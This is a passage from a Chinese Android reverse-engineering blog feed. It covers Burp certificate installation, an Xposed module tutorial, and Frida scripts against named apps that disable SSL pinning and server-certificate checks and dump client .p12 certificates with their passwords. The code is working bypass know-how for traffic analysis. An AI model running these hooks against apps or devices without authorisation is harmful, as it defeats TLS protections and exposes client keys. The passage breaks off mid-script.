class="number">8889</span></span><br><span class="line"></span><br><span class="line">代理类型：SOCKS5</span><br></pre></td></tr></table></figure><p>配置规则</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">匹配类型：匹配所有地址</span><br><span class="line">动作：通过代理连接</span><br><span class="line">代理/代理组：上一步配置的代理 </span><br></pre></td></tr></table></figure><p>3、开启抓包</p><p>点击开启VPN</p><h2 id="使用burp抓包"><a href="#使用burp抓包" class="headerlink" title="使用burp抓包"></a>使用burp抓包</h2><p>抓包的一般过程跟charles类似就不多说了，需要注意的是burp抓包android https时需要提前对证书进行转换</p><p>burp提供的在线下载是der格式的文件，需要先导出进行转换</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform DER -<span class="keyword">in</span> test.der -out burp.pem</span><br></pre></td></tr></table></figure><p>push到sdcard中</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push burp.pem /sdcard</span><br></pre></td></tr></table></figure><p>进入手机设置-加密与凭据-从存储设备安装，点击刚刚push到手机上面的burp.pem进行安装就可以了 </p><h3 id="开启外部代理"><a href="#开启外部代理" class="headerlink" title="开启外部代理"></a>开启外部代理</h3><p>外部代理设置为梯子的端口，这样经过burp的流量就可以访问外网了</p><p><img src="https://i.loli.net/2021/11/04/XD2y9FHOBS5C8rL.png" alt="Untitled"></p><h2 id="证书移动到根目录"><a href="#证书移动到根目录" class="headerlink" title="证书移动到根目录"></a>证书移动到根目录</h2><p>默认安装的证书在用户目录，可以通过安装magisk插件Move Certificates自动把证书移到root目录 </p><p>也可以手动移动 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;data&#x2F;misc&#x2F;user&#x2F;0&#x2F;cacerts-added</span><br><span class="line">mount -o remount,rw &#x2F;</span><br><span class="line">cp * &#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;</span><br><span class="line">mount -o remount,ro &#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android中间人抓包工具使用&quot;&gt;&lt;a href=&quot;#Android中间人抓包工具使用&quot; class=&quot;headerlink&quot; title=&quot;Android中间人抓包工具使用&quot;&gt;&lt;/a&gt;Android中间人抓包工具使用&lt;/h1&gt;&lt;h2 id=&quot;使用Charles</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Xposed插件开发（一）：环境搭建</title>
    <link href="https://tutucoo.github.io/2021/10/23/Xposed%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://tutucoo.github.io/2021/10/23/Xposed%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2021-10-23T08:22:12.000Z</published>
    <updated>2021-11-04T09:32:37.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Xposed简介"><a href="#Xposed简介" class="headerlink" title="Xposed简介"></a><strong>Xposed简介</strong></h1><p>通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h1><p>dalvik环境下安装比较简单，直接下载xposedinstaller安装就可以了，因为年代久远，dalvik环境已经很少见了。</p><p>ART环境下安装需要下载Xposed<em>sdk</em>.zip文件和XposedInstaller.apk文件，zip文件需要在recovery mode中刷入，XposedInstaller是模块管理工具，直接安装就可以使用。</p><p>Xposed正式版最后支持到7.1，7.1以后的就不再支持了，现在一般使用EdXposed或者LSPosed作为替代。</p><p>EdXposed和LSPosed安装都非常简单，在Magisk app搜索安装就可以，这两个框架都依赖于riru框架，riru同样也是在Magisk app里进行下载安装 。</p><h1 id="基于Xposed的插件框架"><a href="#基于Xposed的插件框架" class="headerlink" title="基于Xposed的插件框架"></a><strong>基于Xposed的插件框架</strong></h1><p>Xposed的受欢迎程度下降的主要原因是Magisk，它提供了“无系统”的方法。Xposed Framework修改了Android系统，从而触发Google SafetyNet禁用诸如Google Pay，Netflix和Pokemon GO之类的功能。另一方面，Magisk不会修改系统。它使用引导分区而不是系统。当请求系统文件时，Magisk会在其位置覆盖“虚拟文件”。</p><p>现在Xposed可以与Magisk一起使用。Xposed Framework可以作为Magisk模块安装。这意味着Xposed也可以是无系统的，您可以在不触发Google SafetyNet的情况下使用mod。</p><h2 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h2><p>1、导入XposedBridge<br>放入项目libs文件夹中并add as library</p><p><img src="https://i.loli.net/2021/10/23/Hc7lxBud3oXja2N.png" alt="Untitled"></p><p>2、设置libs为<code>compileOnly</code></p><p>因为xposedBridgeApi-54.jar是很老的库，如果设置为implementation就会被编译进app，app就会报错</p><p><img src="https://i.loli.net/2021/10/23/glhk1NnHRfbWou3.png" alt="Untitled"></p><p>修改如下</p><p><img src="https://i.loli.net/2021/10/23/9hgNyz4AePlSkEq.png" alt="Untitled"></p><p>3、在AndroidManifest.xml中声明元数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">package</span>=<span class="string">&quot;de.robv.android.xposed.mods.tutorial&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> &gt;</span></span><br><span class="line"> </span><br><span class="line">     <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;15&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">     &lt;application</span><br><span class="line">         android:icon=&quot;@drawable/ic_launcher&quot;</span><br><span class="line">         android:label=&quot;@string/app_name&quot; &gt;</span><br><span class="line">         &lt;meta-data</span><br><span class="line">             android:name=&quot;xposedmodule&quot;</span><br><span class="line">             android:value=&quot;true&quot; /&gt;</span><br><span class="line">         &lt;meta-data</span><br><span class="line">             android:name=&quot;xposeddescription&quot;</span><br><span class="line">             android:value=&quot;Easy example which makes the status bar clock red and adds a smiley&quot; /&gt;</span><br><span class="line">         &lt;meta-data</span><br><span class="line">             android:name=&quot;xposedminversion&quot;</span><br><span class="line">             android:value=&quot;53&quot; /&gt;</span><br><span class="line">     <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4、编写hook代码</p><p>新建一个Test文件</p><p><img src="https://i.loli.net/2021/10/23/7XyTYVldNutHURA.png" alt="Untitled"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"><span class="comment">//这里会打印所有加载的包名，包括系统的apk</span></span><br><span class="line">        Log.i(<span class="string">&quot;tutucoo&quot;</span>, <span class="string">&quot;handleLoadPackage: &quot;</span> + loadPackageParam.packageName);</span><br><span class="line"><span class="comment">//会在xposed管理apk的日志里看到打印的所有系统包名</span></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Test-&gt;&quot;</span> + loadPackageParam.packageName);</span><br><span class="line"><span class="comment">//这里对目标apk进行hook，在进入apk时如果正确hook，会在xposed管理器apk的日志处看到下面的日志（此时logcat选择目标apk也会打印Xposed日志</span></span><br><span class="line">        <span class="keyword">if</span> (loadPackageParam.packageName.equals(<span class="string">&quot;com.example.simpleencryption&quot;</span>))&#123;</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;--------------packageName is com.example.simpleencryption------------&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、编写xposed_init文件<br>在main文件夹下新建文件夹assets，再新建文件xposed_init指定入口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 包名+类名</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/23/cqfYWZ1N5Ed2XnH.png" alt="Untitled"></p><p>如果有多个hook文件，分多行声明，哪个先声明，哪个就先生效</p><p>6、编译并安装模块</p><p>编译apk，安装到手机，在Xposed管理器中启用模块，重启</p><p>此时应该可以在logcat中看到打印的日志了</p><p><img src="https://i.loli.net/2021/10/23/DJwZWYmASk26gIX.png" alt="Untitled"></p><p>logcat同样也会打印xposedbridge.log打印的日志</p><p><img src="https://i.loli.net/2021/10/23/fKr23ZMAapEgcTG.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Xposed简介&quot;&gt;&lt;a href=&quot;#Xposed简介&quot; class=&quot;headerlink&quot; title=&quot;Xposed简介&quot;&gt;&lt;/a&gt;&lt;strong&gt;Xposed简介&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;通过替换/system/bin/app_process程序</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>滴哒清单过混淆SSL Pinning抓包</title>
    <link href="https://tutucoo.github.io/2021/10/21/%E6%BB%B4%E5%93%92%E6%B8%85%E5%8D%95%E8%BF%87%E6%B7%B7%E6%B7%86SSL%20Pinning%E6%8A%93%E5%8C%85/"/>
    <id>https://tutucoo.github.io/2021/10/21/%E6%BB%B4%E5%93%92%E6%B8%85%E5%8D%95%E8%BF%87%E6%B7%B7%E6%B7%86SSL%20Pinning%E6%8A%93%E5%8C%85/</id>
    <published>2021-10-21T06:57:48.000Z</published>
    <updated>2021-10-21T06:59:24.654Z</updated>
    
    <content type="html"><![CDATA[<p>app版本：5.8.6.1</p><p>设备版本：Android8.1</p><p>正常对滴哒进行抓包提示Charles不可信，那么就可以猜测使用了SSL Pinning，具体是哪一种pinning要看它的网络框架，对app进行反编译可以看到是okhttp3的网络框架 </p><p><img src="https://i.loli.net/2021/10/21/ns4mPQRCcabEy1r.png" alt="Untitled"></p><p>参考DroidSSLUnpinning对Okhttp3的ssl pinner hook代码，可以看到目标hook函数有两个参数，第一个参数是字符串，第二个参数是List，那么只要找这个函数并对它进行hook就可以了，但是这里直接使用这个脚本是无法Hook成功的，原因是app进行了类名函数名混淆，所以先要找到类名和函数名</p><p><img src="https://i.loli.net/2021/10/21/RQnvVTk9FcLsrWi.png" alt="Untitled"></p><p>进入objection</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -N -h <span class="number">192.168</span><span class="number">.77</span><span class="number">.161</span> -p <span class="number">8888</span> -g cn.ticktick.task explore</span><br></pre></td></tr></table></figure><p>搜索File，证书一般会通过File相关的类进行传递，只要找到sslpinning的关键字对其进行hook就可能实现绕过了</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes File</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/21/s4S1FyCMd9IBxzZ.png" alt="Untitled"></p><p>监视这个类的所有方法调用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method java.io.File.$init --dump-args --dump-backtrace --dump-<span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>看到调用栈中存在CertificatePinner类</p><p><img src="https://i.loli.net/2021/10/21/MylakI9N8mDB1qn.png" alt="Untitled"></p><p>加载wallbreaker插件，看下a函数的参数 ，可以看到参数跟上面分析的脚本的参数是一致的，第一个参数都是String，第二个参数是List</p><p><img src="https://i.loli.net/2021/10/21/8b49kaZG5fryw1j.png" alt="Untitled"></p><p>看下这个类的实例</p><p><img src="https://i.loli.net/2021/10/21/e8u4ajzUgi1Fc5I.png" alt="Untitled"></p><p>dump实例，这样看的更清楚</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker objectdump --fullname <span class="number">0x22fa</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/21/IyP8GDtc7EpakLM.png" alt="Untitled"></p><p>那么只要对这个函数进行hook就可以了</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookCer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.use(<span class="string">&quot;z1.g&quot;</span>).a.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;z1.g was called !&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(hookCer)</span><br></pre></td></tr></table></figure><p>这样就可以正常抓包了 </p><p><img src="https://i.loli.net/2021/10/21/w9ZE853esy4qOIk.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;app版本：5.8.6.1&lt;/p&gt;
&lt;p&gt;设备版本：Android8.1&lt;/p&gt;
&lt;p&gt;正常对滴哒进行抓包提示Charles不可信，那么就可以猜测使用了SSL Pinning，具体是哪一种pinning要看它的网络框架，对app进行反编译可以看到是okhttp3的网络框架 </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>统一社会信用代码app过双向校验抓包</title>
    <link href="https://tutucoo.github.io/2021/10/20/%E7%BB%9F%E4%B8%80%E7%A4%BE%E4%BC%9A%E4%BF%A1%E7%94%A8%E4%BB%A3%E7%A0%81app%E8%BF%87%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%8A%93%E5%8C%85/"/>
    <id>https://tutucoo.github.io/2021/10/20/%E7%BB%9F%E4%B8%80%E7%A4%BE%E4%BC%9A%E4%BF%A1%E7%94%A8%E4%BB%A3%E7%A0%81app%E8%BF%87%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%8A%93%E5%8C%85/</id>
    <published>2021-10-20T08:40:14.000Z</published>
    <updated>2021-10-20T09:04:00.444Z</updated>
    
    <content type="html"><![CDATA[<p>hook找到证书密码并导出p12证书</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_KeyStore_load</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ByteString = Java.use(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> myArray=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">var</span> i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; myArray.length; i++) &#123;</span><br><span class="line">            myArray[i]= <span class="number">0x0</span>;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">var</span> buffer = Java.array(<span class="string">&#x27;byte&#x27;</span>,myArray);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> StringClass = Java.use(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> KeyStore = Java.use(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">        KeyStore.load.overload(<span class="string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;KeyStore.load1:&quot;</span>, arg0);</span><br><span class="line">            <span class="built_in">this</span>.load(arg0);</span><br><span class="line">        &#125;;</span><br><span class="line">        KeyStore.load.overload(<span class="string">&#x27;java.io.InputStream&#x27;</span>, <span class="string">&#x27;[C&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0, arg1</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? StringClass.$new(arg1) : <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (arg0)&#123;</span><br><span class="line">                <span class="keyword">var</span> file =  Java.use(<span class="string">&quot;java.io.File&quot;</span>).$new(<span class="string">&quot;/sdcard/Download/&quot;</span>+ <span class="built_in">String</span>(arg0)+<span class="string">&quot;.p12&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> out = Java.use(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(file);</span><br><span class="line">                <span class="keyword">var</span> r;</span><br><span class="line">                <span class="keyword">while</span>( (r = arg0.read(buffer)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    out.write(buffer,<span class="number">0</span>,r)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;save success!&quot;</span>)</span><br><span class="line">                out.close()</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.load(arg0, arg1);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;hook_KeyStore_load...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    hook_ssl()</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/20/lpPKmbI9aWZRFSt.png" alt="Untitled"></p><p>导入p12证书后仍然抓不到包，根据提示，客户端对服务器也进行了校验，可以通过hook ssl来绕过ssl pinning</p><p><img src="https://i.loli.net/2021/10/20/9ye5Mn6VxGc3iSD.png" alt="Untitled"></p><p>对ssl进行hook，对所有重载函数都置空</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_ssl</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ClassName = <span class="string">&quot;com.android.org.conscrypt.Platform&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> Platform = Java.use(ClassName);</span><br><span class="line">        <span class="keyword">var</span> targetMethod = <span class="string">&quot;checkServerTrusted&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> len = Platform[targetMethod].overloads.length;</span><br><span class="line">        <span class="built_in">console</span>.log(len);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            Platform[targetMethod].overloads[i].implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;class:&quot;</span>, ClassName, <span class="string">&quot;target:&quot;</span>, targetMethod, <span class="string">&quot; i:&quot;</span>, i, <span class="built_in">arguments</span>);</span><br><span class="line">                <span class="comment">//printStack(ClassName + &quot;.&quot; + targetMethod);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    hook_ssl()</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><p>成功绕过双向校验</p><p><img src="https://i.loli.net/2021/10/20/k35iGMmZQ9HjPn2.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;hook找到证书密码并导出p12证书&lt;/p&gt;
&lt;figure class=&quot;highlight jsx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Soul过客户端证书检测抓包</title>
    <link href="https://tutucoo.github.io/2021/10/20/Soul%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%81%E4%B9%A6%E6%A3%80%E6%B5%8B%E6%8A%93%E5%8C%85/"/>
    <id>https://tutucoo.github.io/2021/10/20/Soul%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%81%E4%B9%A6%E6%A3%80%E6%B5%8B%E6%8A%93%E5%8C%85/</id>
    <published>2021-10-20T07:45:18.000Z</published>
    <updated>2021-10-20T08:17:54.694Z</updated>
    
    <content type="html"><![CDATA[<p>使用charles对soul进行抓包提示服务器拒绝连接，猜测是服务端通过p12证书对客户端进行校验 </p><p><img src="https://i.loli.net/2021/10/20/tDvJ7XKrYCh1Hwu.png" alt="Untitled"></p><p>一般这种情况使用frida脚本对KeyStore进行hook，把p12写到sdcard中并获取密钥</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_KeyStore_load</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ByteString = Java.use(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> myArray=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">var</span> i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; myArray.length; i++) &#123;</span><br><span class="line">            myArray[i]= <span class="number">0x0</span>;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">var</span> buffer = Java.array(<span class="string">&#x27;byte&#x27;</span>,myArray);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> StringClass = Java.use(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> KeyStore = Java.use(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">        KeyStore.load.overload(<span class="string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;KeyStore.load1:&quot;</span>, arg0);</span><br><span class="line">            <span class="built_in">this</span>.load(arg0);</span><br><span class="line">        &#125;;</span><br><span class="line">        KeyStore.load.overload(<span class="string">&#x27;java.io.InputStream&#x27;</span>, <span class="string">&#x27;[C&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0, arg1</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? StringClass.$new(arg1) : <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (arg0)&#123;</span><br><span class="line">                <span class="keyword">var</span> file =  Java.use(<span class="string">&quot;java.io.File&quot;</span>).$new(<span class="string">&quot;/sdcard/Download/&quot;</span>+ <span class="built_in">String</span>(arg0)+<span class="string">&quot;.p12&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> out = Java.use(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(file);</span><br><span class="line">                <span class="keyword">var</span> r;</span><br><span class="line">                <span class="keyword">while</span>( (r = arg0.read(buffer)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    out.write(buffer,<span class="number">0</span>,r)</span><br><span class="line">                &#125;</span><br><span class="line">                <span 